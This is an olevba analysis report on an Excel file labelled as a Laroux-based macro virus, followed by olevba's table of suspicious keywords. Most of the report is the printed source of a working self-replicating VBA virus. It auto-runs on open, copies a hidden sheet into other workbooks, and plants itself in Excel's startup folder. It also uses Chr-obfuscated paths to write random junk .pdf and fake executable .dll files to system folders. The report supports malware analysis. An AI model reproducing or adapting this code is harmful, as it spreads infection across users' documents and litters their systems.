olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-2cbbc6b220c3ac3545465347de4461466e64b4e9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO FirstGo.bas 
in file: Virus.MSExcel.Laroux-based-2cbbc6b220c3ac3545465347de4461466e64b4e9 - OLE stream: '_VBA_PROJECT_CUR/VBA/FirstGo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
    Application.OnSheetActivate = "Runner"
End Sub
Sub Runner()
Randomize
On Error Resume Next
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "FirstGo.XLS")
    If m$ = "FirstGo.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
Select Case whichfile
Case 1
    Application.ScreenUpdating = False
    nzzz4$ = ActiveWorkbook.Name
    s$ = Workbooks(nzzz4$).Sheets(1).Name
    p4$ = ActiveWorkbook.Path
    If s$ <> "FirstGo" Then
    Workbooks("FirstGo.XLS").Sheets("FirstGo").Copy before:=Workbooks(nzzz4$).Sheets(1)
    Workbooks(nzzz4$).Sheets("FirstGo").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "FirstGo.XLS!Runner"
Case 10
    Application.ScreenUpdating = False
    nzzz4$ = ActiveWorkbook.Name
    Sheets("FirstGo").Visible = True
    Sheets("FirstGo").Select
    Sheets("FirstGo").Copy
    cw4$ = CurDir()
    nen$ = ActiveWorkbook.Name
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    cc$ = Application.StartupPath
    Workbooks(nen$).SaveAs Filename:=Application.StartupPath & "/" & "FirstGo.XLS", FileFormat:=xlNormal, Password:="", WriteResPassword:="", ReadOnlyRecommended:=False, CreateBackup:=False
    nenw$ = ActiveWorkbook.Name
    ChDir cw4$
    Workbooks(nzzz4$).Sheets("FirstGo").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "FirstGo.XLS!Runner"
Case Else
End Select
On Error Resume Next
For ii = 90 To 75 Step -1
temp = Rnd
ff$ = ""
dd$ = Chr(ii)
ppp$ = Chr(ii) + Chr(58) + Chr(92) + Chr(80) + Chr(85) + Chr(66) + Chr(76) + Chr(73) + Chr(67)
pppp$ = Chr(92) + Chr(80) + Chr(85) + Chr(82) + Chr(71) + Chr(69) + Chr(46) + Chr(69) + Chr(88) + Chr(69)
pp$ = ppp$ + pppp$
ff$ = Dir(pp$)
fff$ = Chr(80) + Chr(85) + Chr(82) + Chr(71) + Chr(69) + Chr(46) + Chr(69) + Chr(88) + Chr(69)
If ff$ = fff$ Then
o$ = ""
For ooooo = 1 To 8
o$ = o$ + Chr(Int(Rnd * 26) + 97)
Next ooooo
oo$ = o$ + Chr(46) + Chr(112) + Chr(100) + Chr(102)
o$ = ppp$ + Chr(92) + oo$
SERDD = Int(Rnd * 9) + 9
    If Dir(o$) <> oo$ Then
    SERDD = 1
        Open o$ For Output As #1
                Print #1, "Novell System PrintDef Device Definition File"
                Print #1, "COPYRIGHT (c) 1987, by Novell Inc.  All Rights Reserved"
                Print #1, Space(2000)
                For iii = 1 To 3 + Int(3 * Rnd)
                    qa$ = Space(Int(15 * Rnd) + 30) + "____________(*________       sdss  g(*hvÛnhÑ'kn )__yGy__  bb^^À^     I ((END630%0 /diablo load end exec} ///X    â#N :¹     ;%stoppðedZX                X pop                    ë    # .##sldf[àpw[''[''''''s][äâ"
                        For i = 1 To 9
                        num = Int(240 * Rnd) + i
qa$ = qa$ + String((Int(99 * i * Rnd) + 99), num) + qa$ + String((Int(999 * Rnd) + 99), num)
                        Next i
                    qa$ = qa$ + qa$
                    qa$ = qa$ + qa$
                    Print #1, qa$;
                Next iii
        Close #1
    End If
ii = 75
End If
Next ii
ff$ = ""
dd$ = Chr(ii)
ws$ = Environ("winbootdir") + Chr(92) + Chr(83) + Chr(89) + Chr(83) + Chr(84) + Chr(69) + Chr(77)
f$ = Chr(77) + Chr(65) + Chr(73) + Chr(78) + Chr(46) + Chr(67) + Chr(80) + Chr(76)
pp$ = ws$ + Chr(92) + f$
ff$ = Dir(pp$)
If ff$ = f$ Then
o$ = ""
For ooooo = 1 To 8
o$ = o$ + Chr(Int(Rnd * 26) + 97)
Next ooooo
oo$ = o$ + Chr(46) + Chr(100) + Chr(108) + Chr(108)
o$ = ws$ + Chr(92) + Chr(92) + oo$
If Dir(o$) <> oo$ Then
    qa$ = ""
    For ii = 1 To 5 + SERDD
    qa$ = qa$ + String(1, (Int(Rnd * 205) + 33)) + " "
    Next ii
    Open o$ For Output As #1
        Print #1, "MZP   " + Chr(3) + "          "; qa$ + String(55, 0);
        Print #1, "L=!  This program cannot be run in DOS mode." + String(1111 + SERDD * 9, 0);
        For ii = (Int(Rnd * 9) + 1) To 666 + (9 * SERDD)
        qa$ = qa$ + String(1, (Int(Rnd * 205) + 33)) + "      " + String(SERDD, SERDD)
        Print #1, qa$;
        Next ii
        For ii = 1 To 9
        Print #1, String(35055 * SERDD + 99999, 0);
        Next ii
        For ii = (Int(Rnd * 5) + 1) To 9 + SERDD * (Int(Rnd * 5) + 1)
        Print #1, String(1, (Int(Rnd * 205) + 33)) + "  ";
        Next ii
    Close #1
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  FirstG
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
+----------+--------------------+---------------------------------------------+

